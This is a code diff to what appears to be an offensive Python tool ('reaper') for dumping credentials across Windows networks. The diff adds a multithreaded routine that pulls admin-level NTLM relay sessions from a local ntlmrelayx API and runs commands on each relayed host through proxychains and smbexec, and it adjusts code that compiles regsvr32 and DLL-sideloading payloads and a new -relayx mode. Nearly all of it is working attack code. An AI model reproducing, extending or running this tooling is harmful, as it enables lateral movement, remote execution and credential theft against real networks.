@@ -83,6 +83,7 @@ color_reset = '\033[0m'
 green_plus = '{}[+]{}'.format(color_GRE, color_reset)
 red_minus = '{}[-]{}'.format(color_RED, color_reset)
 gold_plus = '{}[+]{}'.format(color_YELL, color_reset)
+yellow_minus = '{}[-]{}'.format(color_YELL, color_reset)
 
 reaper_banner = """
 
@@ -2149,8 +2150,6 @@ def gen_payload_regsvr32_rtlcp(share_name, payload_name, drive_letter, runasppl)
     os.system('sudo x86_64-w64-mingw32-g++ /var/tmp/{}/pl.cpp -fpermissive -Wwrite-strings -w -I {}/src/ -static -shared -o /var/tmp/{}/{}.dll -ldbghelp -lpsapi'.format(share_name, cwd, share_name, payload_name))
     os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))
 
-    return ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
-
 
 def gen_payload_dllsideload_rtlcp(share_name, drive_letter, runasppl):
     load_RtlCreateProcessReflection = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
@@ -2687,6 +2686,35 @@ def alt_exec_newfile_printer(): # im aware of the issue with getting the loop to
     except KeyboardInterrupt:
         pass
 
+def relayx_dump_mt_execute(reaper_command, relayx_dat):
+    printnlog('{}[+]{} Attacking {} as {}'.format(color_BLU, color_reset, relayx_dat[1], relayx_dat[2]))
+
+    if logging.getLogger().level == logging.DEBUG:  # if debug is enabled print the command else just log it
+        printnlog('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+    else:
+        lognoprint('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+    # run the command
+    data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+    retries = 0
+    while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:  # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
+        data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}@{} -silent -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+        if retries >= 12 and data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
+            printnlog('{}[!]{} {}: Max Retries hit, skipping'.format(color_YELL, color_reset, relayx_dat[1]))
+            break
+        else:
+            retries += 1
+    if logging.getLogger().level == logging.DEBUG:  # if were debugging print the output of smbexec-shellless
+        printnlog(data_out)
+    else:  # otherwise just log it to the outputfile
+        lognoprint(data_out)
+
+    printnlog('{}[+]{} {}: Completed'.format(color_BLU, color_reset, relayx_dat[1]))
+
+    if data_out.find('STATUS_ACCESS_DENIED') == -1 and data_out.find('STATUS_LOGON_TYPE_NOT_GRANTED') == -1 and data_out.find('Connection refused') == -1 and retries < 12 and data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') == -1:  # make sure it ran right before adding it to dumped ips
+        with open('{}/hist'.format(cwd), 'a') as f:  # keep a log of what ips have been dumped
+            f.write(str(relayx_dat[1]) + '\n')
+            f.close()
+
 def relayx_dump(reaper_command):
     headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
     url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
@@ -2716,39 +2744,35 @@ def relayx_dump(reaper_command):
             tmp = tmp.split('],')
 
             # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus
+            uniq = []
+            uniq_ips = []
+            for thing in tmp: # this will uniq the items returned from ntlmrelayx that are admin status true
+                dat = thing.replace(']', '').split(',')
+                if dat[1] not in uniq_ips and dat[3] == 'TRUE':
+                    uniq.append(thing)
+                    uniq_ips.append(dat[1])
 
-            for item in tmp:
-                relayx_dat = item.replace(']', '').split(',')
-                if relayx_dat[3] == 'TRUE':
-                    if relayx_dat[1] not in dumped_ips: # make sure we dont dump ips we have already dumped
-                        printnlog('{}[+]{} Attacking {} as {}'.format(color_BLU, color_reset, relayx_dat[1], relayx_dat[2]))
+            with ProcessPool(max_workers=options.threads) as thread_exe:
+                for item in uniq:
+                    relayx_dat = item.replace(']', '').split(',')
+                    if relayx_dat[3] == 'TRUE':
+                        if relayx_dat[1] not in dumped_ips: # make sure we dont dump ips we have already dumped
+                            try:
+                                out = thread_exe.schedule(relayx_dump_mt_execute, (reaper_command, relayx_dat,), timeout=options.timeout)
+                            except Exception as e:
+                                if logging.getLogger().level == logging.DEBUG:
+                                    import traceback
 
-                        if logging.getLogger().level == logging.DEBUG: # if debug is enabled print the command else just log it
-                            printnlog('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+                                    traceback.print_exc()
+                                lognoprint(str(e) + '\n')
+                                logging.error(str(e))
+                                continue
+                            except KeyboardInterrupt as e:
+                                continue
                         else:
-                            lognoprint('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
-                        # run the command
-                        data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
-                        retries = 0
-                        while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1: # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
-                            data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}@{} -silent -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
-                            if retries >= 12 and data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
-                                printnlog('{}[!]{} {}: Max Retries hit, skipping'.format(color_YELL, color_reset, relayx_dat[1]))
-                                break
-                            else:
-                                retries += 1
-                        if logging.getLogger().level == logging.DEBUG: # if were debugging print the output of smbexec-shellless
-                            printnlog(data_out)
-                        else: # otherwise just log it to the outputfile
-                            lognoprint(data_out)
+                            printnlog('{} {} is in hist file. Skipping...' .format(yellow_minus, relayx_dat[1]))
 
-                        printnlog('{}[+]{} {}: Completed'.format(color_BLU, color_reset, relayx_dat[1]))
-
-                        if data_out.find('STATUS_ACCESS_DENIED') == -1 and data_out.find('STATUS_LOGON_TYPE_NOT_GRANTED') == -1 and data_out.find('Connection refused') == -1 and retries < 12 and data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') == -1: # make sure it ran right before adding it to dumped ips
-                            dumped_ips.append(relayx_dat[1]) # add the dumped host to the dumped_ips to prevent it from being run again
-                            with open('{}/hist'.format(cwd), 'a') as f: # keep a log of what ips have been dumped
-                                f.write(str(relayx_dat[1]) + '\n')
-                                f.close()
+            time.sleep(2)
         else:
             printnlog('No Relays Available!')
 
@@ -3180,7 +3204,7 @@ if __name__ == '__main__':
             logging.error('Wrong COMVERSION format, use dot separated integers e.g. "5.7"')
             sys.exit(1)
 
-    if '-oe' in sys.argv:
+    if '-oe' in sys.argv or '-relayx' in sys.argv:
         options.target = 'eriujf/eriuhe:\'rguire\'@1'
 
     domain, username, password, address = parse_target(options.target)
@@ -3276,7 +3300,7 @@ if __name__ == '__main__':
 
         port445_check(local_ip)  # check if port 445 is in use
 
-        if '-oe' not in sys.argv:  # why scan if we not gonna do anything
+        if '-oe' not in sys.argv and '-relayx' not in sys.argv:  # why scan if we not gonna do anything
             addresses = do_ip(address, local_ip)  # gets a list of up hosts
 
             if len(addresses) < 1:  # ensure that there are targets otherwise whats the point
@@ -3325,10 +3349,10 @@ if __name__ == '__main__':
         printnlog('\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n'.format(share_name, share_user, share_pass))
 
         # automatically find the best drive to use
-        if options.drive is None and (options.method == 'wmiexec' or options.method == 'smbexec') and options.oe == False:
+        if options.drive is None and (options.method == 'wmiexec' or options.method == 'smbexec') and options.oe == False and options.relayx == False:
             drive_letter = auto_drive(addresses, domain)
 
-        if options.oe:  # This is so that if you are using -oe the payload has an address in the file that it checks for the output naming convention of hotname-ip.dmp otherwise it will error
+        if options.oe or options.relayx:  # This is so that if you are using -oe the payload has an address in the file that it checks for the output naming convention of hotname-ip.dmp otherwise it will error
             addresses = ['23423.5463.1234.3465']
 
         if options.payload == 'msbuild':
@@ -3348,7 +3372,8 @@ if __name__ == '__main__':
         elif options.payload == 'exe-rtlcp':
             gen_payload_exe_rtlcp(share_name, payload_name, drive_letter, options.runasppl)
         elif options.payload == 'regsvr32-rtlcp':
-            addresses_file = gen_payload_regsvr32_rtlcp(share_name, payload_name, drive_letter, options.runasppl)
+            gen_payload_regsvr32_rtlcp(share_name, payload_name, drive_letter, options.runasppl)
+            addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25))) # the rtlcp payloads do not use an addresses file, however regsvr32 expects one as an argument so we make one up.
         elif options.payload == 'dllsideload-rtlcp':
             gen_payload_dllsideload_rtlcp(share_name, drive_letter, options.runasppl)
 
